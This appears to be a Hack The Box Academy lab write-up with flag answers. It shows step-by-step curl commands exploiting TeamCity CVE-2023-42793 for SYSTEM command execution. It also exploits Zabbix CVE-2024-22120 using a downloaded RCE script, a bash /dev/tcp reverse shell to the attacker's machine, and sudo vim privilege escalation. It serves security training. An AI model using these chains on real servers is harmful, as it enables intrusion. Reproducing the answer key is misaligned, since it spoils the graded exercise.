
| Section                                          | Question Number | Answer                           |
| ------------------------------------------------ | --------------- | -------------------------------- |
| Usage Example: JetBrains TeamCity CVE-2023-42793 | Question 1      | 29757d1f8a0de16c6711bceab9d35749 |
| Usage Example: Zabbix CVE-2024-22120             | Question 1      | 7371c170c113fed700a17c4da7da7ebf |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Usage Example: JetBrains TeamCity CVE-2023-42793

## Question 1

### "Exploit the CVE-2023-42793 vulnerability on the spawned target and enter the content of the root.txt file located at the Administrator user's Desktop folder as your answer."

After spawning the target, students will open a terminal and are going to proceed to exploit `CVE-2023-42793` and obtain an Administrator token (inside the `value` parameter) using `cURL` to send a `POST` request targeting the `/app/rest/users/id:1/tokens/RPC2` endpoint:

Code: shell

```shell
curl -X POST http://STMIP/app/rest/users/id:1/tokens/RPC2
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-z9z5rop7yg]─[~]
└──╼ [★]$ curl -X POST http://10.129.22.176/app/rest/users/id:1/tokens/RPC2

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2024-12-05T00:24:09.948-06:00" value="eyJ0eXAiOiAiVENWMiJ9.ZE5WVFYyM09YTm41R1JNVU50Uy1BbXhJUmhF.MjdkNWY4ZGItNjkzYi00ZTYzLWJhYTktMGFhMGQ1NjU2NDM1"/>
```

Students will enable debug mode in the TeamCity application by sending a `POST` request to the `/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true` endpoint using the token obtained previously using the `-H` header option to specify the `Authorization: Bearer` value followed by the token. :

Code: shell

```shell
curl -X POST "http://STMIP/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true" -H "Authorization: Bearer eyJ0eXA <SNIP> Q1NjU2NDM1"
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-z9z5rop7yg]─[~]
└──╼ [★]$ curl -X POST "http://10.129.22.176/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ZE5WVFYyM09YTm41R1JNVU50Uy1BbXhJUmhF.MjdkNWY4ZGItNjkzYi00ZTYzLWJhYTktMGFhMGQ1NjU2NDM1"
```

Subsequently, the students will restart the application to apply the change to debug mode targeting the `/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties` endpoint using `cURL`, specifying the Administrator token obtained earlier:

Code: shell

```shell
curl "http://STMIP/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties" -H "Authorization: Bearer eyJ0eXA <SNIP> Q1NjU2NDM1"
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-z9z5rop7yg]─[~]
└──╼ [★]$ curl "http://10.129.22.176/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ZE5WVFYyM09YTm41R1JNVU50Uy1BbXhJUmhF.MjdkNWY4ZGItNjkzYi00ZTYzLWJhYTktMGFhMGQ1NjU2NDM1"

    <!DOCTYPE html>
    <html lang="en" class="admin-ui">
      <head>
        <title>TeamCity</title>

<link rel="Shortcut Icon" href="/favicon.ico?v10" type="image/x-icon" sizes="16x16 32x32"/>
<meta charset="UTF-8">

<SNIP>

</div>
  <div data-iframe-height></div>
</div>
</form>

      <div data-iframe-height></div>
      </body>
    </html>
```

Next, students will send a `POST` request to the `/app/rest/debug/processes?exePath=cmd.exe&params=/c%20whoami` using the `whoami` command to get information about the current user context that the application is running as and to find out the application is running in the context of `NT AUTHORITY\SYSTEM`:

Code: shell

```shell
curl -X POST "http://STMIP/app/rest/debug/processes?exePath=cmd.exe&params=/c%20whoami" -H "Authorization: Bearer eyJ0eXA <SNIP> Q1NjU2NDM1"
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-z9z5rop7yg]─[~]
└──╼ [★]$ curl -X POST "http://10.129.22.176/app/rest/debug/processes?exePath=cmd.exe&params=/c%20whoami" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ZE5WVFYyM09YTm41R1JNVU50Uy1BbXhJUmhF.MjdkNWY4ZGItNjkzYi00ZTYzLWJhYTktMGFhMGQ1NjU2NDM1"

StdOut:nt authority\system

StdErr: 
Exit code: 0
Time: 160ms
```

Subsequently, students will use `python3` to URL encode the command to get the contents of the `root.txt` flag file:

Code: shell

```shell
python3 -c 'import urllib.parse; print(urllib.parse.quote("type C:\\Users\\Administrator\\Desktop\\root.txt"))'
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-z9z5rop7yg]─[~]
└──╼ [★]$ python3 -c 'import urllib.parse; print(urllib.parse.quote("type C:\\Users\\Administrator\\Desktop\\root.txt"))'

type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Croot.txt
```

Students will use the URL-encoded command to obtain the flag from the `root.txt` file located on the Administrator's Desktop:

Code: shell

```shell
curl -X POST "http://STMIP/app/rest/debug/processes?exePath=cmd.exe&params=/c%20type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Croot.txt" -H "Authorization: Bearer eyJ0eXA <SNIP> Q1NjU2NDM1"
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-z9z5rop7yg]─[~]
└──╼ [★]$ curl -X POST "http://10.129.22.176/app/rest/debug/processes?exePath=cmd.exe&params=/c%20type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Croot.txt" -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ZE5WVFYyM09YTm41R1JNVU50Uy1BbXhJUmhF.MjdkNWY4ZGItNjkzYi00ZTYzLWJhYTktMGFhMGQ1NjU2NDM1"

StdOut: {hidden}
StdErr: 
Exit code: 0
Time: 84ms
```

Answer: `29757d1f8a0de16c6711bceab9d35749`

# Usage Example: Zabbix CVE-2024-22120

## Question 1

### "Exploit the CVE-2024-22120 vulnerability on the spawned target and enter the content of the root.txt file located at the /root directory as your answer."

After spawning the target, students will proceed to obtain an authentication token by sending a `POST` request to Zabbix's API and specifying the method of `user.login` with the credentials `htb-student:mysecurepassword` to the `api_jsonrpc.php` endpoint using `cURL`:

Code: shell

```shell
curl -X POST -H "Content-Type: application/json" -d '{
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        "username": "htb-student",
        "password": "mysecurepassword" },
    "id": 1,
    "auth": null }' http://STMIP/api_jsonrpc.php
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-160mjd9rc6]─[~]
└──╼ [★]$ curl -X POST -H "Content-Type: application/json" -d '{
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        "username": "htb-student",
        "password": "mysecurepassword" },
    "id": 1,
    "auth": null }' http://10.129.231.23/api_jsonrpc.php

{"jsonrpc":"2.0","result":"9774be870f7d20bae61866f77edcfa7c","id":1}
```

Subsequently, students will use the obtained token to send a `POST` request to Zabbix's API and specify the `host.get` method using `cURL`, and the token attained from the earlier to obtain the `hostid` value:

Code: shell

```shell
curl -X POST -H "Content-Type: application/json" -d '{
      "jsonrpc": "2.0",
      "method": "host.get",
      "params": {
         "output": ["hostid", "host"]
       },
      "auth": "9774be870f7d20bae61866f77edcfa7c",
      "id": 1 }' http://STMIP/api_jsonrpc.php
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-160mjd9rc6]─[~]
└──╼ [★]$ curl -X POST -H "Content-Type: application/json" -d '{
      "jsonrpc": "2.0",
      "method": "host.get",
      "params": {
         "output": ["hostid", "host"]
       },
      "auth": "9774be870f7d20bae61866f77edcfa7c",
      "id": 1 }' http://10.129.231.23/api_jsonrpc.php
  
{"jsonrpc":"2.0","result":[{"hostid":"10084","host":"Zabbix server"}],"id":1}
```

Next, students will download the Python3 [exploit](https://github.com/W01fh4cker/CVE-2024-22120-RCE/blob/main/CVE-2024-22120-RCE.py) locally and install the `pwn` library using `pip3` to perform the Time-Based Blind SQL Injection:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/W01fh4cker/CVE-2024-22120-RCE/refs/heads/main/CVE-2024-22120-RCE.py
pip3 install pwn
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-160mjd9rc6]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/W01fh4cker/CVE-2024-22120-RCE/refs/heads/main/CVE-2024-22120-RCE.py

┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-160mjd9rc6]─[~]
└──╼ [★]$ pip3 install pwn

Defaulting to user installation because normal site-packages is not writeable
Collecting pwn
  Downloading pwn-1.0.tar.gz (1.1 kB)
  Preparing metadata (setup.py) ... done
Requirement already satisfied: pwntools in /usr/local/lib/python3.11/dist-packages (from pwn) (4.13.1)
Requirement already satisfied: paramiko>=1.15.2 in /usr/local/lib/python3.11/dist-packages (from pwntools->pwn) (3.5.0)

<SNIP>
```

Students will use the exploit to obtain remote code execution on the target using the previously obtained token (`sid`) and hostid:

Code: shell

```shell
python3 CVE-2024-22120-RCE.py --ip STMIP --sid 9774be870f7d20bae61866f77edcfa7c --hostid 10084
```

```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-160mjd9rc6]─[~]
└──╼ [★]$ python3 CVE-2024-22120-RCE.py --ip 10.129.231.23 --sid 9774be870f7d20bae61866f77edcfa7c --hostid 10084

(!) sessionid=0b1ab84721d989c27e3214af2959f254989c27e3214af2959f254
[zabbix_cmd]>>: 
```

Next, students will perform enumeration by querying the user context in which Zabbix is running, finding out this user is not `root` and not part of the `root` group within the semi-interactive shell:

Code: shell

```shell
id
```

```
[zabbix_cmd]>>:  id
uid=114(zabbix) gid=120(zabbix) groups=120(zabbix)
```

Students will open a new terminal and start a `netcat` listener:

```shell
nc -nvlp PWNPO
```
```
┌─[us-academy-2]─[10.10.14.169]─[htb-ac-8414@htb-160mjd9rc6]─[~]
└──╼ [★]$ nc -nvlp 9001

listening on [any] 9001 ...
```

Students will use a Bash reverse shell to obtain an interactive shell:

```shell
bash -c "bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1"
```
```
[zabbix_cmd]>>:  bash -c "bash -i >& /dev/tcp/10.10.14.169/9001 0>&1"
```

Subsequently, students will return to the netcat listener and are going to list the commands permitted to be run as the root user on the target, finding out that the user `zabbix` can run `/usr/bin/vim` as root's privileges:

```shell
sudo -l
```
```
zabbix@ubuntu:/$ sudo -l

sudo -l
Matching Defaults entries for zabbix on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zabbix may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/vim
```

Students will utilize the [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo) list to bypass local security restrictions and escalate to the `root` user using the `vim` binary:

```shell
sudo /usr/bin/vim -c ':!/bin/sh'
```
```
zabbix@ubuntu:/$ sudo /usr/bin/vim -c ':!/bin/sh'

sudo /usr/bin/vim -c ':!/bin/sh'
Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320

<SNIP>
```

Subsequently, students will query the contents of the `root.txt` file located in the `/root` directory to obtain the flag:

```shell
cat /root/root.txt
```
```
cat /root/root.txt

{hidden}
```

Answer: `7371c170c113fed700a17c4da7da7ebf`